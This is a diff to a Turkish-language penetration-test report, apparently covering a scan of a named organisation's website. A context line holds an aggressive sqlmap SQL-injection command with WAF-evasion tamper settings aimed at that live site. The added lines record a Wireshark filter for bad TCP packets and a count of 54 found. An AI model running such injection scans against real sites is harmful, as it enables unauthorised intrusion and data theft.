@@ -24,3 +24,13 @@ WAF ile korunduğu için bazı sql injectionlar denenemedi bunlar txtler içinde
 
 ### 4-) python sqlmap.py -u "https://www.mustso.org.tr/Default.aspx" --dbs --forms --crawl=2 --dbms=postgresql --tamper=space2comment --random-agent --time-sec=10 --level=5 --risk=3
 #### Bu test yüksek fazda olmuştur ve 11 saate yakın bir süreçte tamamlanmıştır.
+
+
+
+# Testler (Wireshark) üzerinden yapılmıştır.
+
+## Bad TCP
+tcp.analysis.flags && !tcp.analysis.window_update && !tcp.analysis.keep_alive && !tcp.analysis.keep_alive_ack <br>
+Bad TCP 54 tane taradımız ağ’da bulduk, bunları göremek için github linkin’den ulaşabilirsiniz
+
+
